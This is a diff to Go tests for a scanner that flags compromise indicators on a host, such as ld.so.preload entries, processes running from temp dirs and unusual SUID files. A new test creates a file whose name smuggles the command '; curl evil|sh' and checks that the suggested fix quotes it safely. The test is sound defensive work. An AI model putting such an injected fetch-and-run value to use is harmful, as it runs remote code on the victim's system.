@@ -99,7 +99,7 @@ func TestLive(t *testing.T) {
 	want := map[string]finding.Severity{
 		"ioc.ld-preload /etc/ld.so.preload is not empty":                                          finding.High,
 		"ioc.suspicious-process Process running from a temp dir: /dev/shm/.x":                     finding.High,
-		"ioc.suspicious-process Process running from a deleted binary: /usr/sbin/nginx (deleted)": finding.Medium,
+		"ioc.suspicious-process Process running from a deleted binary: /usr/sbin/nginx (deleted)": finding.Low,
 	}
 	if len(got) != len(want) {
 		t.Fatalf("got %v", got)
@@ -108,5 +108,18 @@ func TestLive(t *testing.T) {
 		if got[k] != sev {
 			t.Errorf("want %q (%s), got %v", k, sev, got)
 		}
+	}
+}
+
+func TestSUIDUnusual(t *testing.T) {
+	root := t.TempDir()
+	write(t, root, "tmp/.x; curl evil|sh", "")
+	write(t, root, "usr/bin/passwd", "")
+	snap := Snapshot{"suid": {"/tmp/.x; curl evil|sh": "", "/usr/bin/passwd": ""}}
+	defer func(u int) { rootUID = u }(rootUID)
+	rootUID = os.Getuid()
+	fs := suidUnusual(root, snap)
+	if len(fs) != 1 || fs[0].Fix != `ls -l '/tmp/.x; curl evil|sh'; sudo rm '/tmp/.x; curl evil|sh'   # then assume compromise` {
+		t.Fatalf("%+v", fs)
 	}
 }
